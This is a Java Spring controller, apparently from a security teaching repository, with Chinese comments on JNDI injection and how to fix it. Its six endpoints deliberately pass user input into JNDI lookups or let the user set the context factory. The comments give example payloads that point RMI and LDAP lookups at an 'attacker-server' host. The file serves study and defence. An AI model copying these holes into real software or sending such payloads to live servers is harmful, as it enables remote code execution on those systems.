package com.freedom.securitysamples.api.jndiInjection;

import org.springframework.web.bind.annotation.*;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;

/**
 * JNDI注入漏洞示例控制器
 * 说明：JNDI（Java命名和目录接口）是Java用于查找和访问命名服务/目录服务的API，
 *       若将用户可控输入直接用于JNDI lookup操作或配置核心环境变量（如工厂类、服务地址），
 *       攻击者可构造恶意JNDI地址（如RMI/LDAP协议），诱导服务器加载并执行远程恶意类，
 *       最终导致**远程代码执行（RCE）**，是Java生态中高危漏洞之一。
 * 常见风险：
 * 1. 远程代码执行（RCE）：加载恶意类执行任意命令（如删除文件、获取服务器权限）
 * 2. 敏感信息泄露：读取服务器配置、数据库凭证等敏感数据
 * 3. 服务器劫持：完全控制目标服务器，植入后门或挖矿程序
 * 修复原则：
 * 1. 禁止用户可控输入直接参与JNDI lookup操作
 * 2. 使用白名单限制允许访问的资源名、协议（禁用RMI/LDAP等危险协议）
 * 3. 升级JDK版本（JDK 8u121+、JDK 7u80+默认限制JNDI危险协议的类加载）
 * 4. 禁止用户控制InitialContextFactory、PROVIDER_URL等核心环境变量
 * 5. 若需使用JNDI，仅从可信的固定地址/资源池获取资源
 */
@RestController
@RequestMapping("/security-example/jndi-injection")
public class JndiInjectionVulnerabilityController {

    /**
     * 不安全示例：RMI协议JNDI查找（用户输入直接用于lookup）
     * 漏洞点：
     * 1. 用户输入的jndiResourceName直接传入InitialContext.lookup()
     * 2. 虽配置了"trusted-server"的PROVIDER_URL，但恶意输入可覆盖为攻击者地址（如完整RMI URL）
     * 攻击示例：
     * jndiResourceName参数传入 "rmi://attacker-server:1099/EvilObject"
     * （其中EvilObject是攻击者在RMI服务器上部署的恶意类，包含恶意static代码块）
     * 风险：服务器会连接攻击者的RMI服务器，加载并执行EvilObject中的恶意代码，导致RCE
     */
    @GetMapping("/unsafe/rmi-jndi-lookup")
    public String unsafeRmiJndiLookup(String jndiResourceName) throws NamingException {
        Hashtable<String, String> jndiEnvironment = new Hashtable<>();
        // 配置RMI上下文工厂（固定配置，但用户输入可绕过）
        jndiEnvironment.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        jndiEnvironment.put(Context.PROVIDER_URL, "rmi://trusted-server:1099");
        InitialContext initialContext = new InitialContext(jndiEnvironment);

        // 危险实践：用户输入直接用于JNDI lookup，无任何过滤
        initialContext.lookup(jndiResourceName);
        return "{'msg':'false'}";
    }

    /**
     * 不安全示例：LDAP协议JNDI查找（用户输入直接作为查找路径）
     * 漏洞点：将用户可控的ldapUrl直接传入DirContext.lookup()，未验证地址合法性
     * 攻击示例：
     * ldapUrl参数传入 "ldap://attacker-server:389/cn=EvilClass,dc=example,dc=com"
     * （攻击者通过LDAP服务器返回恶意类的引用，诱导服务器加载执行）
     * 风险：LDAP协议是JNDI注入的高频利用场景，可直接触发远程代码执行，危害极大
     */
    @GetMapping("/unsafe/ldap-jndi-lookup")
    public String unsafeLdapJndiLookup(String ldapUrl) throws NamingException {
        Hashtable<String, String> env = new Hashtable<>();
        // 配置LDAP上下文工厂
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://localhost:389"); // 本地LDAP配置可被恶意输入覆盖
        DirContext ctx = new InitialDirContext(env);

        // 危险实践：直接使用用户输入的LDAP路径进行lookup
        return ctx.lookup(ldapUrl).toString();
    }

    /**
     * 不安全示例：动态拼接用户输入构建JNDI URL（RMI协议）
     * 漏洞点：将用户输入作为RMI URL的一部分动态拼接，未过滤恶意地址
     * 攻击示例：
     * userInput参数传入 "attacker-server:1099/EvilResource"
     * 拼接后JNDI URL为 "rmi://attacker-server:1099/EvilResource"
     * 风险：即使未直接使用用户输入作为完整URL，拼接过程仍可能被注入恶意地址，触发RCE
     */
    @PostMapping("/unsafe/dynamic-jndi-url-build")
    public String unsafeDynamicJndiUrlBuild(@RequestBody String userInput) throws NamingException {
        // 危险实践：用户输入直接拼接为RMI协议的JNDI URL
        String jndiUrl = "rmi://" + userInput + "/resource";
        Context ctx = new InitialContext();

        // 危险操作：使用动态构建的恶意URL进行lookup
        return ctx.lookup(jndiUrl).toString();
    }

    /**
     * 不安全示例：DNS协议JNDI查找（用户输入直接作为DNS查询名）
     * 漏洞点：用户可控的dnsName直接用于DNS协议的JNDI lookup，虽DNS本身难直接RCE，但存在间接风险
     * 攻击示例：
     * dnsName参数传入 "malicious-domain.com"
     * 风险：
     * 1. 信息泄露：通过DNS查询记录获取服务器IP、网络拓扑等信息
     * 2. 间接攻击：结合DNS劫持，将查询结果指向恶意服务器，配合其他漏洞触发RCE
     */
    @GetMapping("/unsafe/dns-jndi-lookup")
    public String unsafeDnsJndiLookup(String dnsName) throws NamingException {
        Hashtable<String, String> env = new Hashtable<>();
        // 配置DNS上下文工厂
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");
        env.put(Context.PROVIDER_URL, "dns://8.8.8.8"); // 使用谷歌DNS服务器
        Context ctx = new InitialContext(env);

        // 危险实践：用户输入直接作为DNS查询名进行lookup
        return ctx.lookup(dnsName).toString();
    }

    /**
     * 不安全示例：允许用户选择JNDI协议+资源（多协议动态切换）
     * 漏洞点：
     * 1. 用户可控制协议类型（RMI/LDAP）
     * 2. 用户输入的resource直接用于lookup，无白名单限制
     * 攻击示例：
     * protocol参数传入 "ldap"，resource参数传入 "ldap://attacker-server:389/EvilClass"
     * 风险：攻击者可灵活选择高风险协议（如LDAP）进行利用，扩大攻击成功概率
     */
    @GetMapping("/unsafe/multi-protocol-jndi-lookup")
    public String unsafeMultiProtocolJndiLookup(String protocol, String resource) throws NamingException {
        Hashtable<String, String> env = new Hashtable<>();

        // 危险实践：允许用户选择JNDI上下文工厂（决定协议类型）
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                protocol.equals("ldap") ? "com.sun.jndi.ldap.LdapCtxFactory" :
                        "com.sun.jndi.rmi.registry.RegistryContextFactory");

        // 危险实践：协议类型由用户控制，拼接为PROVIDER_URL
        env.put(Context.PROVIDER_URL, protocol + "://localhost:1099");
        Context ctx = new InitialContext(env);

        // 危险操作：用户输入的resource直接用于lookup
        return ctx.lookup(resource).toString();
    }

    /**
     * 不安全示例：用户控制JNDI核心环境变量（初始化工厂类）
     * 漏洞点：用户输入的factoryUrl直接作为InitialContextFactory（JNDI核心工厂类），完全失控
     * 攻击示例：
     * factoryUrl参数传入 "com.attacker.EvilInitialContextFactory"
     * （恶意工厂类会篡改JNDI lookup逻辑，加载攻击者指定的恶意资源）
     * 风险：最高级别的失控——核心工厂类由用户控制，可直接执行任意恶意逻辑，100%导致RCE
     */
    @GetMapping("/unsafe/jndi-factory-control")
    public String unsafeJndiFactoryControl(String factoryUrl, String resourceName) throws NamingException {
        Hashtable<String, String> env = new Hashtable<>();

        // 极度危险：允许用户直接控制JNDI初始化工厂类（InitialContextFactory）
        env.put(Context.INITIAL_CONTEXT_FACTORY, factoryUrl);
        Context ctx = new InitialContext(env);

        // 即使resourceName可信，恶意工厂类已导致漏洞
        return ctx.lookup(resourceName).toString();
    }
}